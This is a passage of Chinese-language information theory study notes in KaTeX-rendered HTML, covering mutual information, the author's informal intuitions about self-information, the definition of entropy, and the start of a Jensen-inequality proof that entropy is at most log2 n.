class="mclose">)</span></span></span></span></li></ul></li><li><p>互信息量</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">;</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">I(x_i;y_j)=I(x_i)-I(x_i|y_j)=\log_2\frac{p(x_i|y_j)}{p(x_i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.55232em;vertical-align:-0.52em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.03232em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">∣</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，即先验不确定度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo></mrow><annotation encoding="application/x-tex">-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span></span></span></span>后验不确定度</li></ul></li></ul><p><font color=red>直观理解：</font></p><p><font color=blue>自信息量：信息本身发生的概率决定本信息的<strong>可识别度</strong>。信息发生的概率越高，可识别度越低，只需要很少的比特位就可以将其完全表示，提供给我们的信息也越少；信息发生的概率越低，可识别度越高，需要更多的比特位来表示，提供给我们的信息也越多。我们可以想象一下，如果一个事件一定发生，那这个时间对于我们没有价值，因为我们不需要任何信息就知道它一定发生；如果一个事件很难发生，比如中彩票，只要发生，就能提供具有很强识别度的信息，中彩票之后，你可以买车，买很多东西都可以，但是不中的话，也就只是不中而已，生活照常进行没有任何影响。我们可以粗略地将每一个比特位看成概率的划分，如对于2位比特位，其有00,01,10,11四种状态，可以将整个概率空间1分为4个部分，每个部分代表25%概率。假设有4个事件，概率均为25%，且任意两个事件不可能同时发生（想象成箱子中有4个球，随机拿一个球）。此时，如果我们只给出一个比特位，如0，它能确定我们拿出来的是什么球吗？显然不能，因为一个比特位只有两种状态：0和1。如果将2位比特位与摸出的球的编号一一对应，那么一位比特位就能够代表摸出某2个球，但不可能是剩下2个球。我们虽然不能通过1个比特位确定到底拿的是什么球，但至少缩小了范围，当然这还不够。如果我们能够知道两个比特位，那么我们就能够最终确定我们拿出来的是什么球。</font></p><p><font color=blue><strong>注意！每一个比特位对于概率的分配都是均分，不存在对于一个比特位中0和1表示不同的概率。</strong></font></p><p><font color=blue>我们考虑一种最为普通的情况：事件A发生的概率为90%，那么我们只需要1个比特位就能够确认事件A是否发生。如果将0代表为A发生，那么1就代表A一定不发生吗？那可未必。A发生的概率是90%，比特位为0的概率为50%，因此如果比特位为1，那么A发生的概率还有80%（条件概率），但是此时A是否发生就是不确定的了。不过我们并不需要考虑1的情况，因为0就足以确认A发生。如果我们要表示A不发生的概率，那么就至少需要4个比特位，4个比特位共有16种状态，其中至多可以有一个状态能被完全包含在A不发生的概率之中，这也就确定了A不发生。</font></p><p><font color=blue>联合自信息量：理解了自信息量之后，联合自信息量也就不难理解。不过是将一个随机变量变成了多个而已。</font></p><p><font color=blue>条件自信息量：需要分先验和后验进行理解。先验的条件自信息量以先验概率为基础计算，又称信道转移概率。举一个通俗的例子：假如在某地冬天，一天气温低于0度的概率为30%，在低于0度的情况下，附近一条河流结冰的概率为80%。如果我们抛开气温不管只看河流是否结冰，此时河流结冰的概率应为24%，通过河流结冰，我们能够获得较多信息，比如今天大概率很冷。但如果我们已经知道了今天温度低于0度，再看到河流结冰时，能够获取的信息就不多了，因为此时河流结冰几乎是自然而然发生的事情，不需要任何怀疑。相反地，后验的条件自信息量以后验概率为基础计算，与先验概率的理解类似。还是上面的例子，今天河流结冰了，那么如果今天温度高于0度，那就很值得研究了，因为这种情况理论上是不可能发生的。</font></p><p><font color=blue>互信息量：表现两个随机变量之间的联系。为随机变量X的先验不确定度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo></mrow><annotation encoding="application/x-tex">-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span></span></span></span>后验不确定度。如果互信息量大于0，说明Y的发生减少了X提供的信息量。如果小于0，说明Y的发生增加了X提供的信息量。因为X和Y如果有联系，那么Y的发生可能会改变X发生的概率。</font></p><h2 id="七-熵"><a class="markdownIt-Anchor" href="#七-熵"></a> 七、熵</h2><p>定义：随机变量X的信息熵定义为自信息量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span>的数学期望，简称熵。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">[</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X)=E[I(x)]=-\sum_{x\in X}p(x)(\log_2p(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.3717110000000003em;vertical-align:-1.321706em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p>理解：</p><ul><li>熵非负</li><li>信源发出前，表示信源的平均不确定度</li><li>信源发出后，表示信源提供的平均信息量</li><li>是一个统计量，反映了随机变量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>的随机性</li></ul><h3 id="定理26"><a class="markdownIt-Anchor" href="#定理26"></a> 定理2.6</h3><p>假设随机变量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>的概率分布为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>p</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">p_1,p_2,...,p_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>≤</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">H(X)\le \log_2n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span>，当且仅当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex">p_i=\frac{1}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时等式成立</p><p>证明：<br />使用琴生（Jensen）不等式：在上凸函数中，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>≤</mo><mi>f</mi><mo stretchy="false">(</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo separator="true">,</mo><msub><mi>a</mi><mi>i</mi></msub><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\sum_{i=1}^na_if(x_i)\le f(\sum_{i=1}^na_ix_i),\sum_{i=1}^na_i=1,a_i&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 